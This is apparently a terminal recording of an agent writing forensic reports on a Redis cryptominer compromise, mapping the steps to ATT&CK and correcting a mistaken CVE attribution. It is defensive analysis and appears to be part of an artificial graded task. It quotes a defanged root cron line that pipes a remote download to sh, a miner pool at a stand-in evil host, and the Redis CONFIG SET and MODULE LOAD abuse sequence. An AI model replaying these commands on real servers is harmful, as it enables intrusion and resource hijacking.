[161.397891, "o", "### Step 1: Initial Access (ATT&CK T1133 - External Remote Services)\r\n\u001b[?2004l\r"]
[161.397923, "o", "\u001b[?2004h"]
[161.397971, "o", "> "]
[161.398325, "o", "The host ran Redis bound to all network interfaces (`0.0.0.0`) with `protected-mode` disabled and no password authentication configured (`/disk/etc/redis/redis.conf:3`). An external attacker connected directly to TCP port 6379 from IP `198.51.100.170` (`/sas/cti/advisory.txt:6`).\r\n\u001b[?2004l\r"]
[161.398385, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[161.398471, "o", "### Step 2: Execution (ATT&CK T1059.004 - Unix Shell)\r\n\u001b[?2004l\r\u001b[?2004h"]
[161.398489, "o", "> "]
[161.398886, "o", "The attacker utilized Redis `CONFIG SET` commands to write malicious files directly to the host filesystem, as well as staging exploit module binaries (`/disk/tmp/.redis/exp.so:1`, `/sas/cti/advisory.txt:13`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[161.398992, "o", "### Step 3: Impact / Resource Hijacking (ATT&CK T1496 - Resource Hijacking)"]
[161.399964, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> The attacker dropped and executed `kdevtmpfsi` (XMRig family miner process) under `/tmp/.redis/kdevtmpfsi` (`/disk/tmp/.redis/kdevtmpfsi:1`, `/sas/alerts.json:2`). The process connected to mining pool `stratum+tcp://xmr.redis.evil:3333` causing sustained high CPU consumption.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 4: Persistence (ATT&CK T1053.003 - Cron)\r\n\u001b[?2004l\r\u001b[?2004h> Persistence was established by writing a root cron job into `/var/spool/cron/crontabs/root` (`/disk/var/spool/cron/crontabs/root:5`, `/sas/alerts.json:10`). The cron entry executes `curl hxxp://198.51.100.170/x | sh` to periodically re-download and maintain the mining payload.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 5: Evasion / Stealth (ATT&CK T1574.006 - Dynamic Linker Hijacking)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[161.400032, "o", "To hide processes and avoid detection by system tools, the attacker modified `/etc/ld.so.preload` (`/disk/etc/ld.so.preload:1`) to preload `/lib/.hide.so`, a userland shared library rootkit. This mechanism was **silent** and not captured in `/sas/alerts.json`.\r\n\u001b[?2004l\r\u001b[?2004h"]
[161.40007, "o", "> \r\n\u001b[?2004l\r"]
[161.400126, "o", "\u001b[?2004h> "]
[161.400294, "o", "## 4. Alerted vs. Silent Evidence Breakdown\r\n\u001b[?2004l\r"]
[161.40036, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[161.400477, "o", "| Artifact / Finding | File Path | ATT&CK Technique | Alert Feed Status | Evidence Citation |\r\n\u001b[?2004l\r"]
[161.400508, "o", "\u001b[?2004h> "]
[161.400692, "o", "|-------------------|-----------|------------------|-------------------|-------------------|"]
[161.400754, "o", "\r\n\u001b[?2004l\r\u001b[?2004h"]
[161.400764, "o", "> "]
[161.400978, "o", "| Miner Process | `/tmp/.redis/kdevtmpfsi` | T1496 | Alerted (`ALERT-01`) | `/disk/tmp/.redis/kdevtmpfsi:1` / `/sas/alerts.json:2` |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[161.401296, "o", "| Cron Persistence | `/var/spool/cron/crontabs/root` | T1053.003 | Alerted (`ALERT-02`) | `/disk/var/spool/cron/crontabs/root:5` / `/sas/alerts.json:10` |\r\n\u001b[?2004l\r"]
[161.401396, "o", "\u001b[?2004h> "]
[161.401621, "o", "| Weak Redis Config | `/etc/redis/redis.conf` | T1133 | Alerted (`ALERT-03`) | `/disk/etc/redis/redis.conf:3` / `/sas/baseline.json:1` |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[161.401843, "o", "| Dynamic Linker Preload Hook | `/etc/ld.so.preload` | T1574.006 | **SILENT** (Missed by SAS) | `/disk/etc/ld.so.preload:1` |\r\n\u001b[?2004l\r"]
[161.401943, "o", "\u001b[?2004h> "]
[161.402154, "o", "| Staged Exploit / Module Sample | `/tmp/.redis/exp.so` | T1059.004 | **SILENT** (Missed by SAS) | `/disk/tmp/.redis/exp.so:1` |\r\n\u001b[?2004l\r\u001b[?2004h> "]
[161.402385, "o", "| Wiped Binary / Beacon Record | `/var/lib/.cache/.wiped.bin` | T1071.001 / T1070.004 | **SILENT** (Missed by SAS) | `/disk/var/lib/.cache/.wiped.bin:1` |\r\n\u001b[?2004l\r\u001b[?2004h"]
[161.402452, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> EOF\r\n\u001b[?2004l\r"]
[161.403299, "o", "\u001b[?2004hroot@43839b8f6af0:/app# "]
[168.280767, "i", "cat << 'EOF' > /app/vuln-report.md\n# Vulnerability-Driven Entry Analysis Report\n\n## 1. Entry Vector Identification\nDetailed analysis of host evidence (`/disk/etc/redis/redis.conf:3`) and threat intelligence (`/sas/cti/advisory.txt:10`) confirms that the primary entry vector for host `redis-prod-01` was **not** a software memory corruption vulnerability or remote code execution CVE, but rather an **unauthenticated network service exposure and architectural misconfiguration**.\n\n## 2. Refutation of Erroneous CVE Claims\nDraft remediation documentation (`/sas/handoff/change-ticket.md:12`) incorrectly referenced **CVE-2019-0708 (BlueKeep)** targeting Remote Desktop Protocol (RDP).\n- Forensic examination confirms that host `redis-prod-01` is a Debian Linux machine (`/disk/etc/os-release:1`), which does not natively host Microsoft RDP or vulnerable Windows Remote Desktop Services.\n- Review of `/sas/vulns.json:1` shows zero vulnerability scan findings recorded by vulnerability scanners (`[]`).\n- CTI correlation (`/sas/cti/advisory.txt:10`) confirms the entry point was unauthenticated Redis access (MITRE ATT&CK T1133).\n- Therefore, no software patch for CVE-2019-0708 is applicable or required for this host.\n\n## 3. Technical Mechanism of Unauthenticated Redis Compromise\n1. **Insecure Service Configuration** (`/disk/etc/redis/redis.conf:3`):\n   - `bind 0.0.0.0`: Exposed the Redis service to all available external and internal network interfaces.\n   - `protected-mode no`: Explicitly disabled default Redis protections that prevent unauthenticated external connections.\n   - `no password set`: Permitted unauthenticated clients full administrative control over the Redis service.\n\n2. **Exploitation Sequence**:\n   - An external actor at IP `198.51.100.170` (`/sas/cti/advisory.txt:6`) connected to Redis on TCP port 6379.\n   - Using administrative commands (`CONFIG SET dir /var/spool/cron/crontabs` and `CONFIG SET dbfilename root`), the attacker manipulated Redis snapshot/dump functionality to write arbitrary crontab lines into system cron directories (`/disk/var/spool/cron/crontabs/root:5`).\n   - Alternatively or additionally, the attacker loaded custom shared modules using `MODULE LOAD` (`/disk/tmp/.redis/exp.so:1`) to execute shell commands directly under the privilege context of the Redis service daemon (root).\n\n## 4. Conclusion & Confidence Assessment\n- **Confidence Level**: **HIGH**\n- **Primary Evidence**: `/disk/etc/redis/redis.conf:3`, `/disk/var/spool/cron/crontabs/root:5`, `/disk/tmp/.redis/exp.so:1`, `/sas/cti/advisory.txt:10`.\n- **Summary**: Entry was achieved purely through misconfigured access controls on a sensitive service, not via software vulnerability exploitation.\nEOF\n"]
